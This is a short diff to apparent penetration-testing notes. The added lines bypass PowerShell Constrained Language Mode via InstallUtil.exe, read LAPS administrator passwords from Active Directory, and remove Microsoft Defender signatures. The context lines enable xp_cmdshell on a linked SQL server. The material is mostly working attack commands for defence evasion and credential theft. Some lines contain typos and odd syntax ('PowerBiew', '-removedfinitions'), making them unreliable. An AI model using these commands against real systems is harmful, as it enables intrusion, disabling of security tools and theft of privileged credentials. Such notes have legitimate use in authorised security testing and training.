@@ -153,3 +153,21 @@ EXEC ('sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [SQL06];
 -- Execute system commands on the linked server
 EXEC ('xp_cmdshell ''whoami'';') AT [SQL06];
 
+
+
+
+CLM:
+$ExecutionContext.SessionState.LanguageMode
+
+Bypass CLM:
+	https://github.com/calebstewart/bypass-clm
+
+then:
+
+PS C:\> C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile=/LogToConsole=false /U "C:\Windows\Tasks\bypass-clm.exe"
+
+PowerBiew.ps1:
+
+Get-ADObject -Name system -DomainController IP -properties ms-mcs-admpwd
+C:\> .\MpCmdRun.exe -removedfinitions -all
+
